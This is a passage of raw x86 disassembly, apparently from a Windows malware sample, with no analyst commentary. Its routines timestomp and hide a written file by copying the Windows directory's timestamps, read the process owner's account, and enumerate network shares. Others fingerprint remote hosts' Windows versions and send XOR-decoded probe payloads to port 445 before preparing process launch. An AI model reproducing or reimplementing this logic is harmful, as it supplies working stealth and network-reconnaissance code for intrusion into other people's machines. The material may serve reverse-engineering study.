pop     edi
pop     esi
pop     ebx
add     esp, 104h
retn

loc_405E1A:
mov     eax, dword_40A084
mov     edx, lpPathName
sub     eax, ebx
lea     esi, [edx+ebx+5]
sub     eax, 5
jmp     short loc_405E74

loc_405E30:
push    offset aAb      ; "ab"
push    offset FileName ; Filename
call    ds:fopen
mov     edi, eax
add     esp, 8
test    edi, edi
jnz     short loc_405E69
push    eax             ; File
call    ds:fclose
add     esp, 4
mov     byte_40AA20, 45h
call    sub_405140
pop     edi
pop     esi
pop     ebx
add     esp, 104h
retn

loc_405E69:
mov     esi, lpPathName
mov     eax, dword_40A084

loc_405E74:
lea     ecx, [esp+110h+Count]
mov     [esp+110h+Count], eax
push    ecx
push    esi
push    eax
push    esi
call    sub_4037B0
mov     edx, [esp+120h+Count]
push    edi             ; File
push    edx             ; Count
push    1               ; Size
push    esi             ; Str
call    ds:fwrite
push    edi             ; File
call    ds:fclose
mov     eax, dword_40A8B4
add     esp, 24h
test    eax, eax
jz      short loc_405EE1
mov     dword_40A8B4, 0
mov     byte_40AA20, 4Fh
call    sub_405140
push    offset FileName ; lpFileName
call    sub_405EF0
mov     eax, dword_40A088
add     esp, 4
cmp     eax, 56h
jnz     short loc_405EE1
push    offset FileName ; Str
call    sub_406B00
add     esp, 4

loc_405EE1:
pop     edi
pop     esi
pop     ebx
add     esp, 104h
retn
sub_405CD0 endp

align 10h



; int __cdecl sub_405EF0(LPCSTR lpFileName)
sub_405EF0 proc near

CreationTime= _FILETIME ptr -408h
Buffer= byte ptr -400h
lpFileName= dword ptr  4

sub     esp, 408h
lea     eax, [esp+408h+Buffer]
push    ebx
push    esi
push    edi
push    400h            ; uSize
push    eax             ; lpBuffer
call    ds:GetWindowsDirectoryA
mov     esi, ds:CreateFileA
push    0               ; hTemplateFile
push    2000000h        ; dwFlagsAndAttributes
push    3               ; dwCreationDisposition
push    0               ; lpSecurityAttributes
push    5               ; dwShareMode
lea     ecx, [esp+428h+Buffer]
push    80000000h       ; dwDesiredAccess
push    ecx             ; lpFileName
call    esi ; CreateFileA
mov     edi, eax
cmp     edi, 0FFFFFFFFh
jz      short loc_405FA6
mov     ebx, [esp+414h+lpFileName]
push    0               ; hTemplateFile
push    80h             ; dwFlagsAndAttributes
push    3               ; dwCreationDisposition
push    0               ; lpSecurityAttributes
push    0               ; dwShareMode
push    40000000h       ; dwDesiredAccess
push    ebx             ; lpFileName
call    esi ; CreateFileA
mov     esi, eax
cmp     esi, 0FFFFFFFFh
jnz     short loc_405F63
push    edi             ; hObject
call    ds:CloseHandle
pop     edi
pop     esi
pop     ebx
add     esp, 408h
retn

loc_405F63:             ; lpLastWriteTime
push    0
lea     edx, [esp+418h+CreationTime]
push    0               ; lpLastAccessTime
push    edx             ; lpCreationTime
push    edi             ; hFile
call    ds:GetFileTime
lea     eax, [esp+414h+CreationTime]
lea     ecx, [esp+414h+CreationTime]
push    eax             ; lpLastWriteTime
lea     edx, [esp+418h+CreationTime]
push    ecx             ; lpLastAccessTime
push    edx             ; lpCreationTime
push    esi             ; hFile
call    ds:SetFileTime
push    edi             ; hObject
mov     edi, ds:CloseHandle
call    edi ; CloseHandle
push    esi             ; hObject
call    edi ; CloseHandle
push    ebx             ; lpFileName
call    ds:GetFileAttributesA
or      al, 2
push    eax             ; dwFileAttributes
push    ebx             ; lpFileName
call    ds:SetFileAttributesA

loc_405FA6:
pop     edi
pop     esi
pop     ebx
add     esp, 408h
retn
sub_405EF0 endp




; int __cdecl sub_405FB0(HANDLE ProcessHandle, LPSTR Name)
sub_405FB0 proc near

cchReferencedDomainName= dword ptr -4C4h
TokenHandle= dword ptr -4C0h
cchName= dword ptr -4BCh
ReturnLength= dword ptr -4B8h
peUse= dword ptr -4B4h
ReferencedDomainName= byte ptr -4B0h
TokenInformation= dword ptr -3E8h
ProcessHandle= dword ptr  4
Name= dword ptr  8

sub     esp, 4C4h
mov     ecx, [esp+4C4h+ProcessHandle]
lea     eax, [esp+4C4h+TokenHandle]
push    eax             ; TokenHandle
push    20008h          ; DesiredAccess
push    ecx             ; ProcessHandle
mov     [esp+4D0h+cchName], 100h
mov     [esp+4D0h+cchReferencedDomainName], 0C8h
call    ds:OpenProcessToken
test    eax, eax
jnz     short loc_405FE9
add     esp, 4C4h
retn

loc_405FE9:
mov     ecx, [esp+4C4h+TokenHandle]
lea     edx, [esp+4C4h+ReturnLength]
push    edx             ; ReturnLength
lea     eax, [esp+4C8h+TokenInformation]
push    3E8h            ; TokenInformationLength
push    eax             ; TokenInformation
push    1               ; TokenInformationClass
push    ecx             ; TokenHandle
call    ds:GetTokenInformation
test    eax, eax
jnz     short loc_406013
add     esp, 4C4h
retn

loc_406013:
lea     edx, [esp+4C4h+peUse]
lea     eax, [esp+4C4h+cchReferencedDomainName]
push    edx             ; peUse
lea     ecx, [esp+4C8h+ReferencedDomainName]
push    eax             ; cchReferencedDomainName
mov     eax, [esp+4CCh+Name]
lea     edx, [esp+4CCh+cchName]
push    ecx             ; ReferencedDomainName
mov     ecx, [esp+4D0h+TokenInformation]
push    edx             ; cchName
push    eax             ; Name
push    ecx             ; Sid
push    0               ; lpSystemName
call    ds:LookupAccountSidA
neg     eax
sbb     eax, eax
neg     eax
add     esp, 4C4h
retn
sub_405FB0 endp

align 10h



sub_406050 proc near

var_4240= dword ptr -4240h
var_423C= dword ptr -423Ch
var_4238= dword ptr -4238h
dwBytes= dword ptr -4234h
hEnum= dword ptr -4230h
var_422C= dword ptr -422Ch
var_4228= dword ptr -4228h
var_4224= dword ptr -4224h
var_4220= dword ptr -4220h
var_421C= dword ptr -421Ch
var_4218= dword ptr -4218h
var_4214= dword ptr -4214h
var_4210= dword ptr -4210h
var_420C= dword ptr -420Ch
var_4208= dword ptr -4208h
var_4204= byte ptr -4204h
Dest= byte ptr -4200h
var_4000= byte ptr -4000h
var_3FFF= dword ptr -3FFFh
var_3FFB= byte ptr -3FFBh

mov     eax, 4240h
call    __alloca_probe
push    ebx
push    ebp
push    esi
push    edi
push    offset aMprDll_0 ; "Mpr.dll"
call    ds:LoadLibraryA
mov     edi, eax
xor     ebp, ebp
cmp     edi, ebp
jz      loc_406396
mov     ebx, ds:GetProcAddress
push    offset aWnetopenenuma ; "WNetOpenEnumA"
push    edi             ; hModule
call    ebx ; GetProcAddress
push    offset aWnetenumresour ; "WNetEnumResourceA"
push    edi             ; hModule
mov     [esp+4258h+var_4240], eax
call    ebx ; GetProcAddress
mov     esi, eax
push    edi             ; hLibModule
mov     [esp+4254h+var_422C], esi
call    ds:FreeLibrary
cmp     [esp+4250h+var_4240], ebp
jz      loc_406396
cmp     esi, ebp
jz      loc_406396
mov     eax, 2
push    offset asc_409A4C ; "\\\\\\"
mov     [esp+4254h+var_4224], eax
mov     [esp+4254h+var_4218], eax
mov     eax, lpPathName
mov     [esp+4254h+var_4220], ebp
push    eax             ; Str
mov     [esp+4258h+var_421C], 3
mov     [esp+4258h+var_4214], ebp
mov     [esp+4258h+var_4210], ebp
mov     [esp+4258h+var_420C], ebp
mov     [esp+4258h+var_4208], ebp
mov     [esp+4258h+var_4238], ebp
mov     [esp+4258h+dwBytes], 4000h
mov     [esp+4258h+var_423C], 0FFFFFFFFh
mov     ebx, 5
mov     [esp+4258h+var_4000], 47h
call    ds:strstr
add     esp, 8
mov     edi, eax
cmp     edi, ebp
push    5Ch             ; Ch
jz      short loc_40617B
mov     esi, ds:strchr
lea     ecx, [edi+3]
push    ecx             ; Str
call    esi ; strchr
mov     ebp, eax
add     esp, 8
test    ebp, ebp
jz      loc_406353
lea     edx, [ebp+1]
push    5Ch             ; Val
push    edx             ; Str
call    esi ; strchr
add     esp, 8
test    eax, eax
jz      short loc_40616E
inc     edi
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, lpPathName
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
call    sub_404D30
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 4240h
retn

loc_40616E:
inc     edi
mov     byte ptr [ebp+0], 0
mov     [esp+4250h+var_4210], edi
xor     ebp, ebp
jmp     short loc_4061F2

loc_40617B:
mov     ecx, lpPathName
mov     esi, ds:strrchr
push    ecx             ; Str
call    esi ; strrchr
add     esp, 8
cmp     eax, ebp
jz      loc_406353
mov     byte ptr [eax], 0
mov     ecx, lpPathName
cmp     eax, ecx
jz      short loc_4061F2
push    5Ch             ; Ch
push    ecx             ; Str
call    esi ; strrchr
add     esp, 8
cmp     eax, ebp
jz      loc_406353
mov     edx, VersionInformation.dwPlatformId
lea     ecx, [eax+1]
cmp     edx, 2
mov     [esp+4250h+var_4210], ecx
jnz     short loc_4061E2
cmp     eax, lpPathName
jnz     short loc_4061EA
mov     [esp+4250h+var_421C], 6
mov     [esp+4250h+var_4218], 80000002h
mov     [esp+4250h+var_4208], ecx
jmp     short loc_4061F2

loc_4061E2:
cmp     eax, lpPathName
jnz     short loc_4061F2

loc_4061EA:
mov     [esp+4250h+var_4238], 1

loc_4061F2:
lea     edx, [esp+4250h+hEnum]
lea     eax, [esp+4250h+var_4224]
push    edx
push    eax
push    ebp
push    ebp
push    2
call    [esp+4264h+var_4240]
test    eax, eax
jnz     loc_406353
mov     ecx, [esp+4250h+dwBytes]
push    ecx             ; dwBytes
push    40h             ; uFlags
call    ds:GlobalAlloc
mov     esi, eax
mov     [esp+4250h+var_4228], esi

loc_40621F:
mov     ecx, [esp+4250h+dwBytes]
xor     eax, eax
mov     edx, ecx
mov     edi, esi
shr     ecx, 2
rep stosd
mov     ecx, edx
and     ecx, 3
rep stosb
mov     edx, [esp+4250h+hEnum]
lea     eax, [esp+4250h+dwBytes]
push    eax
lea     ecx, [esp+4254h+var_423C]
push    esi
push    ecx
push    edx
call    [esp+4260h+var_422C]
test    eax, eax
jnz     loc_40633D
mov     [esp+4250h+var_4240], eax
mov     eax, [esp+4250h+var_423C]
test    eax, eax
jbe     short loc_40621F
lea     ebp, [esi+14h]

loc_406260:
mov     eax, [ebp+0]
test    eax, eax
jz      loc_406320
cmp     dword ptr [ebp-10h], 1
jnz     short loc_406288
add     eax, 2
push    5Ch             ; Val
push    eax             ; Str
call    ds:strchr
add     esp, 8
test    eax, eax
jz      short loc_406288
inc     eax
mov     [ebp+0], eax

loc_406288:
mov     edi, [ebp+0]
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+ebx+4250h+var_4000]
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
mov     edx, [ebp+0]
or      ecx, 0FFFFFFFFh
mov     edi, edx
repne scasb
mov     eax, [esp+4250h+var_4238]
not     ecx
dec     ecx
add     ebx, ecx
test    eax, eax
jz      short loc_40630E
lea     ecx, [esp+4250h+Dest]
push    ecx             ; Dest
push    edx             ; lpMultiByteStr
call    sub_4063B0
lea     edi, [esp+4258h+Dest]
or      ecx, 0FFFFFFFFh
xor     eax, eax
add     esp, 8
repne scasb
not     ecx
sub     edi, ecx
lea     edx, [esp+ebx+4250h+var_4000]
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
lea     edi, [esp+4250h+Dest]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
dec     ecx
add     ebx, ecx

loc_40630E:
mov     ecx, [ebp-0Ch]
mov     esi, [esp+4250h+var_4228]
inc     ebx
mov     dword ptr [esp+ebx+4250h+var_4000], ecx
add     ebx, 4

loc_406320:
mov     eax, [esp+4250h+var_4240]
mov     ecx, [esp+4250h+var_423C]
inc     eax
add     ebp, 20h
cmp     eax, ecx
mov     [esp+4250h+var_4240], eax
jb      loc_406260
jmp     loc_40621F

loc_40633D:             ; hMem
push    esi
call    ds:GlobalFree
mov     edx, [esp+4250h+hEnum]
push    edx             ; hEnum
call    WNetCloseEnum
cmp     ebx, 5
jnz     short loc_406360

loc_406353:
mov     [esp+4250h+var_3FFB], 0
mov     ebx, 6

loc_406360:
lea     eax, [esp+4250h+var_4204]
lea     ecx, [esp+4250h+var_3FFB]
push    eax
lea     edx, [ebx-5]
push    ecx
lea     eax, [esp+4258h+var_3FFB]
push    edx
push    eax
mov     [esp+4260h+var_3FFF], ebx
call    sub_4037B0
lea     ecx, [esp+4260h+var_4000]
push    ebx
push    ecx
call    sub_402980
add     esp, 18h

loc_406396:
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 4240h
retn
sub_406050 endp

align 10h



; int __cdecl sub_4063B0(LPCSTR lpMultiByteStr, char *Dest)
sub_4063B0 proc near

lpMultiByteStr= dword ptr  4
Dest= dword ptr  8

cmp     VersionInformation.dwPlatformId, 1
jnz     short loc_4063CF
mov     ecx, [esp+lpMultiByteStr]
mov     eax, [esp+Dest]
add     ecx, 2
push    eax             ; Dest
push    ecx             ; int
call    sub_4066E0
add     esp, 8
retn

loc_4063CF:
mov     edx, [esp+Dest]
mov     eax, [esp+lpMultiByteStr]
push    edx             ; char *
push    eax             ; lpMultiByteStr
call    sub_4063F0
add     esp, 8
retn
sub_4063B0 endp

align 10h



; int __cdecl sub_4063F0(LPCSTR lpMultiByteStr, char *)
sub_4063F0 proc near

var_448= dword ptr -448h
var_444= byte ptr -444h
Dest= byte ptr -440h
WideCharStr= word ptr -400h
String= word ptr -200h
lpMultiByteStr= dword ptr  4
arg_4= dword ptr  8

mov     eax, [esp+lpMultiByteStr]
sub     esp, 448h
add     eax, 2
push    ebx
push    ebp
push    esi
push    edi
push    eax
call    ds:WSOCK32_52
mov     ebp, ds:sprintf
test    eax, eax
jz      short loc_406432
mov     ecx, [eax+0Ch]
mov     edx, [ecx]
mov     eax, [edx]
push    eax
call    ds:WSOCK32_11
push    eax
lea     ecx, [esp+45Ch+Dest]
push    offset aS_0     ; "[%s:"
push    ecx             ; Dest
call    ebp ; sprintf
add     esp, 0Ch
jmp     short loc_406458

loc_406432:
mov     edi, offset Class
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+458h+Dest]
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb

loc_406458:
mov     al, [esp+458h+Dest]
test    al, al
jnz     short loc_406486
mov     edi, offset aErr ; "[Err:"
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+458h+Dest]
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb

loc_406486:
push    offset aNetapi32 ; "Netapi32"
call    ds:LoadLibraryA
mov     esi, eax
test    esi, esi
jnz     short loc_4064B4
mov     ecx, [esp+458h+arg_4]
push    offset aSliberr ; "%sLibErr]"
push    ecx             ; Dest
call    ebp ; sprintf
add     esp, 8
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 448h
retn

loc_4064B4:
mov     edi, ds:GetProcAddress
push    offset aNetservergetin ; "NetServerGetInfo"
push    esi             ; hModule
call    edi ; GetProcAddress
mov     ebx, eax
test    ebx, ebx
jnz     short loc_4064D7
lea     edx, [esp+458h+Dest]
push    edx
push    offset aSnetservergeti ; "%sNetServerGetInfo"
jmp     loc_4066C6

loc_4064D7:
push    offset aNetapibufferfr ; "NetApiBufferFree"
push    esi             ; hModule
call    edi ; GetProcAddress
test    eax, eax
mov     dword ptr [esp+458h+var_444], eax
jz      loc_4066BC
mov     edx, [esp+458h+lpMultiByteStr]
lea     ecx, [esp+458h+WideCharStr]
push    200h            ; cchWideChar
push    ecx             ; lpWideCharStr
mov     edi, edx
or      ecx, 0FFFFFFFFh
xor     eax, eax
mov     [esp+460h+var_448], 0
repne scasb
not     ecx
push    ecx             ; cbMultiByte
push    edx             ; lpMultiByteStr
push    eax             ; dwFlags
push    eax             ; CodePage
call    ds:MultiByteToWideChar
lea     edx, [esp+458h+WideCharStr]
lea     eax, [esp+458h+String]
push    edx             ; Format
push    offset aS_1     ; "%s"
push    eax             ; String
call    ds:swprintf
add     esp, 0Ch
lea     ecx, [esp+458h+var_448]
lea     edx, [esp+458h+String]
push    ecx
push    65h
push    edx
call    ebx
test    eax, eax
jnz     loc_40669A
mov     ecx, [esp+458h+var_448]
mov     eax, [ecx]
cmp     eax, 1F4h
ja      loc_40661D
jz      short loc_4065A3
sub     eax, 12Ch
jz      short loc_406594
sub     eax, 64h
jnz     loc_406629
cmp     dword ptr [ecx+8], 4
jnz     short loc_406585
lea     eax, [esp+458h+Dest]
push    eax
push    offset aSwin9x  ; "%sWin9x]"
jmp     loc_40664B

loc_406585:
lea     ecx, [esp+458h+Dest]
push    ecx
push    offset aSwin32  ; "%sWin32]"
jmp     loc_40664B

loc_406594:
lea     edx, [esp+458h+Dest]
push    edx
push    offset aSdos    ; "%sDOS]"
jmp     loc_40664B

loc_4065A3:
mov     eax, [ecx+8]
cmp     eax, 5
jnz     short loc_4065FF
mov     eax, [ecx+0Ch]
test    eax, eax
jnz     short loc_4065C1
lea     eax, [esp+458h+Dest]
push    eax
push    offset aSwin2k  ; "%sWin2K]"
jmp     loc_40664B

loc_4065C1:
cmp     eax, 1
jnz     short loc_4065D2
lea     ecx, [esp+458h+Dest]
push    ecx
push    offset aSwinxp  ; "%sWinXP]"
jmp     short loc_40664B

loc_4065D2:
cmp     eax, 2
jnz     short loc_4065E3
lea     edx, [esp+458h+Dest]
push    edx
push    offset aSwin2003 ; "%sWin2003]"
jmp     short loc_40664B

loc_4065E3:
mov     esi, [esp+458h+arg_4]
push    eax
lea     eax, [esp+45Ch+Dest]
push    5
push    eax
push    offset aSwinntDD ; "%sWinNT%d.%d]"
push    esi             ; Dest
call    ebp ; sprintf
add     esp, 14h
jmp     short loc_406658

loc_4065FF:
mov     ecx, [ecx+0Ch]
mov     esi, [esp+458h+arg_4]
push    ecx
lea     edx, [esp+45Ch+Dest]
push    eax
push    edx
push    offset aSwinntDD ; "%sWinNT%d.%d]"
push    esi             ; Dest
call    ebp ; sprintf
add     esp, 14h
jmp     short loc_406658

loc_40661D:
sub     eax, 258h
jz      short loc_406641
sub     eax, 64h
jz      short loc_406635

loc_406629:
lea     eax, [esp+458h+Dest]
push    eax
push    offset aSunknown ; "%sUnknown]"
jmp     short loc_40664B

loc_406635:
lea     ecx, [esp+458h+Dest]
push    ecx
push    offset aSvms    ; "%sVMS]"
jmp     short loc_40664B

loc_406641:
lea     edx, [esp+458h+Dest]
push    edx
push    offset aSosf    ; "%sOSF]"

loc_40664B:
mov     esi, [esp+460h+arg_4]
push    esi             ; Dest
call    ebp ; sprintf
add     esp, 0Ch

loc_406658:
mov     eax, [esp+458h+var_448]
mov     ecx, [eax+10h]
test    cl, 18h
jnz     short loc_406669
test    ch, 80h
jz      short loc_406686

loc_406669:
mov     edi, esi
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
dec     ecx
mov     byte ptr [ecx+esi-1], 53h
mov     byte ptr [ecx+esi], 5Dh
mov     [ecx+esi+1], al
mov     eax, [esp+458h+var_448]

loc_406686:
test    eax, eax
jz      short loc_4066D3
push    eax
call    dword ptr [esp+45Ch+var_444]
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 448h
retn

loc_40669A:
mov     ecx, [esp+458h+arg_4]
lea     eax, [esp+458h+Dest]
push    eax
push    offset aSerr    ; "%sErr]"
push    ecx             ; Dest
call    ebp ; sprintf
add     esp, 0Ch
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 448h
retn

loc_4066BC:
lea     edx, [esp+458h+Dest]
push    edx
push    offset aSaddrerr ; "%sAddrErr]"

loc_4066C6:
mov     eax, [esp+460h+arg_4]
push    eax             ; Dest
call    ebp ; sprintf
add     esp, 0Ch

loc_4066D3:
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 448h
retn
sub_4063F0 endp

align 10h



; int __cdecl sub_4066E0(int, char *Dest)
sub_4066E0 proc near

var_358= dword ptr -358h
var_354= dword ptr -354h
var_350= byte ptr -350h
var_34C= byte ptr -34Ch
var_34A= word ptr -34Ah
var_348= dword ptr -348h
var_344= byte ptr -344h
var_340= byte ptr -340h
var_33C= dword ptr -33Ch
var_31C= dword ptr -31Ch
var_290= dword ptr -290h
var_1E4= dword ptr -1E4h
var_104= dword ptr -104h
var_100= dword ptr -100h
arg_0= dword ptr  4
Dest= dword ptr  8

sub     esp, 358h
mov     ecx, 22h
xor     eax, eax
push    esi
push    edi
mov     esi, offset unk_409D24
lea     edi, [esp+360h+var_31C]
rep movsd
movsw
mov     ecx, 2Ah
mov     esi, offset unk_409C78
lea     edi, [esp+360h+var_290]
rep movsd
movsb
mov     ecx, 37h
mov     esi, offset unk_409B98
lea     edi, [esp+360h+var_1E4]
rep movsd
movsw
movsb

loc_406726:
mov     cl, byte ptr [esp+eax+360h+var_31C]
xor     cl, 93h
mov     byte ptr [esp+eax+360h+var_31C], cl
inc     eax
cmp     eax, 89h
jb      short loc_406726
xor     eax, eax

loc_40673B:
mov     cl, byte ptr [esp+eax+360h+var_290]
xor     cl, 93h
mov     byte ptr [esp+eax+360h+var_290], cl
inc     eax
cmp     eax, 0A8h
jb      short loc_40673B
xor     eax, eax

loc_406756:
mov     cl, byte ptr [esp+eax+360h+var_1E4]
xor     cl, 93h
mov     byte ptr [esp+eax+360h+var_1E4], cl
inc     eax
cmp     eax, 0DEh
jb      short loc_406756
mov     eax, [esp+360h+arg_0]
push    eax
call    ds:WSOCK32_52
test    eax, eax
jz      short loc_406797
mov     ecx, [eax+0Ch]
mov     edx, [ecx]
mov     eax, [edx]
push    eax
call    ds:WSOCK32_11
lea     edx, [esp+360h+var_33C]
mov     edi, eax
jmp     short loc_4067A0

loc_406797:
lea     edx, [esp+360h+var_33C]
mov     edi, offset Class

loc_4067A0:
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
mov     al, byte ptr [esp+360h+var_33C]
test    al, al
jnz     short loc_4067F5
mov     edi, offset aNoip ; "[NoIP]"
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     edx, ecx
mov     esi, edi
mov     edi, [esp+360h+Dest]
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
pop     edi
pop     esi
add     esp, 358h
retn

loc_4067F5:
mov     edi, 1
push    0
push    edi
push    2
call    ds:WSOCK32_23
mov     esi, eax
cmp     esi, 0FFFFFFFFh
jnz     short loc_406830
mov     ecx, [esp+360h+Dest]
lea     eax, [esp+360h+var_33C]
push    eax
push    offset aSSocketError ; "[%s:SOCKET_ERROR]"
push    ecx             ; Dest
call    ds:sprintf
add     esp, 0Ch
pop     edi
pop     esi
add     esp, 358h
retn

loc_406830:
push    1BDh
mov     word ptr [esp+364h+var_34C], 2
call    ds:WSOCK32_9
lea     edx, [esp+360h+var_33C]
mov     [esp+360h+var_34A], ax
push    edx
call    ds:WSOCK32_10
mov     [esp+360h+var_348], eax
lea     ecx, [esp+360h+var_358]
xor     eax, eax
push    ecx
mov     dword ptr [esp+364h+var_344], eax
push    8004667Eh
push    esi
mov     dword ptr [esp+36Ch+var_340], eax
mov     [esp+36Ch+var_358], edi
call    ds:WSOCK32_12
lea     edx, [esp+360h+var_34C]
push    10h
push    edx
push    esi
mov     [esp+36Ch+var_354], 2
mov     dword ptr [esp+36Ch+var_350], 0
mov     [esp+36Ch+var_100], esi
mov     [esp+36Ch+var_104], edi
call    ds:WSOCK32_4
lea     eax, [esp+360h+var_354]
lea     ecx, [esp+360h+var_104]
push    eax
push    0
push    ecx
lea     edx, [esi+1]
push    0
push    edx
call    ds:WSOCK32_18
test    eax, eax
jg      short loc_4068EB
mov     ecx, [esp+360h+Dest]
lea     eax, [esp+360h+var_33C]
push    eax
push    offset aSUnconnect ; "[%s:Unconnect]"
push    ecx             ; Dest
call    ds:sprintf
add     esp, 0Ch
push    esi
call    ds:WSOCK32_3
pop     edi
pop     esi
add     esp, 358h
retn

loc_4068EB:             ; int
push    edi
mov     edi, [esp+364h+Dest]
lea     edx, [esp+364h+var_33C]
push    edi             ; Dest
push    edx             ; int
lea     eax, [esp+36Ch+var_31C]
push    89h             ; int
push    eax             ; int
push    esi             ; int
call    sub_406960
add     esp, 18h
test    eax, eax
jz      short loc_406957
push    2               ; int
lea     ecx, [esp+364h+var_33C]
push    edi             ; Dest
push    ecx             ; int
lea     edx, [esp+36Ch+var_290]
push    0A8h            ; int
push    edx             ; int
push    esi             ; int
call    sub_406960
add     esp, 18h
test    eax, eax
jz      short loc_406957
push    3               ; int
lea     eax, [esp+364h+var_33C]
push    edi             ; Dest
push    eax             ; int
lea     ecx, [esp+36Ch+var_1E4]
push    0DEh            ; int
push    ecx             ; int
push    esi             ; int
call    sub_406960
add     esp, 18h
push    esi
call    ds:WSOCK32_3

loc_406957:
pop     edi
pop     esi
add     esp, 358h
retn
sub_4066E0 endp




; int __cdecl sub_406960(int, int, int, int, char *Dest, int)
sub_406960 proc near

var_1120= dword ptr -1120h
var_111C= dword ptr -111Ch
var_1118= dword ptr -1118h
var_1114= byte ptr -1114h
var_1104= dword ptr -1104h
var_1100= dword ptr -1100h
var_1000= byte ptr -1000h
var_FD0= byte ptr -0FD0h
arg_0= dword ptr  4
arg_4= dword ptr  8
arg_8= dword ptr  0Ch
arg_C= dword ptr  10h
Dest= dword ptr  14h
arg_14= dword ptr  18h

mov     eax, 1120h
call    __alloca_probe
push    ebx
push    ebp
mov     ebp, ds:WSOCK32_12
push    esi
mov     esi, [esp+112Ch+arg_0]
lea     eax, [esp+112Ch+var_1120]
push    edi
push    eax
mov     edi, 1
push    8004667Eh
push    esi
mov     [esp+113Ch+var_1120], edi
call    ebp ; WSOCK32_12
mov     ecx, [esp+1130h+arg_8]
mov     edx, [esp+1130h+arg_4]
push    0
push    ecx
push    edx
push    esi
mov     [esp+1140h+var_111C], 2
mov     [esp+1140h+var_1118], 0
mov     [esp+1140h+var_1100], esi
mov     [esp+1140h+var_1104], edi
call    dword_40ACE4
mov     ebx, ds:WSOCK32_18
lea     eax, [esp+1130h+var_111C]
push    eax
lea     ecx, [esp+1134h+var_1104]
push    0
lea     edi, [esi+1]
push    ecx
push    0
push    edi
call    ebx ; WSOCK32_18
test    eax, eax
jg      short loc_4069EF
mov     edx, [esp+1130h+arg_C]
push    edx
push    offset aSSenderror ; "[%s:SendError]"
jmp     short loc_406A5D

loc_4069EF:
lea     ecx, [esp+1130h+var_1120]
mov     [esp+1130h+var_1120], 1
push    ecx
push    8004667Eh
push    esi
call    ebp ; WSOCK32_12
lea     edx, [esp+1130h+var_111C]
lea     eax, [esp+1130h+var_1104]
push    edx
push    0
push    0
push    eax
push    edi
mov     [esp+1144h+var_111C], 4
mov     [esp+1144h+var_1118], 0
mov     [esp+1144h+var_1100], esi
mov     [esp+1144h+var_1104], 1
call    ebx ; WSOCK32_18
test    eax, eax
jle     short loc_406A50
push    0
lea     ecx, [esp+1134h+var_1000]
push    640h
push    ecx
push    esi
call    ds:WSOCK32_16
cmp     eax, 0FFFFFFFFh
jnz     short loc_406A82

loc_406A50:
mov     edx, [esp+1130h+arg_C]
push    edx
push    offset aSRcverror ; "[%s:RcvError]"

loc_406A5D:
mov     eax, [esp+1138h+Dest]
push    eax             ; Dest
call    ds:sprintf
add     esp, 0Ch
push    esi
call    ds:WSOCK32_3
pop     edi
pop     esi
pop     ebp
xor     eax, eax
pop     ebx
add     esp, 1120h
retn

loc_406A82:
cmp     [esp+1130h+arg_14], 3
jnz     short loc_406ACC
xor     eax, eax
lea     ecx, [esp+1130h+var_FD0]

loc_406A95:
mov     dl, [ecx]
add     ecx, 2
mov     [esp+eax+1130h+var_1114], dl
inc     eax
cmp     eax, 0Ch
jl      short loc_406A95
mov     ecx, [esp+1130h+arg_C]
mov     edx, [esp+1130h+Dest]
mov     [esp+eax+1130h+var_1114], 0
lea     eax, [esp+1130h+var_1114]
push    eax
push    ecx
push    offset aSS_2    ; "[%s:%s]"
push    edx             ; Dest
call    ds:sprintf
add     esp, 10h

loc_406ACC:
pop     edi
pop     esi
pop     ebp
mov     eax, 1
pop     ebx
add     esp, 1120h
retn
sub_406960 endp

align 10h


; Attributes: noreturn

sub_406AE0 proc near
push    0               ; dwType
push    offset byte_40A72C ; pszValue
call    sub_401BA0
add     esp, 8
push    1               ; uExitCode
call    ds:ExitProcess
sub_406AE0 endp

; [00000001 BYTES: COLLAPSED FUNCTION nullsub_1. PRESS CTRL-NUMPAD+ TO EXPAND]
align 10h



; int __cdecl sub_406B00(char *Str)
sub_406B00 proc near

var_258= dword ptr -258h
ProcessInformation= _PROCESS_INFORMATION ptr -254h
StartupInfo= _STARTUPINFOA ptr -244h
var_200= byte ptr -200h
var_1FF= byte ptr -1FFh
Str= dword ptr  4

sub     esp, 258h
push    ebp
push    esi
push    edi
push    offset LibFileName ; "Kernel32.dll"
call    ds:LoadLibraryA
push    offset aSetcurrentdire ; "SetCurrentDirectoryA"
push    eax             ; hModule
call    ds:GetProcAddress
mov     ebp, [esp+264h+Str]
push    offset asc_409DD8 ; "\\\\"
push    ebp             ; Str
mov     [esp+26Ch+var_258], eax
call    ds:strstr
add     esp, 8
test    eax, eax
jnz     short loc_406BB1
mov     edi, ebp
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
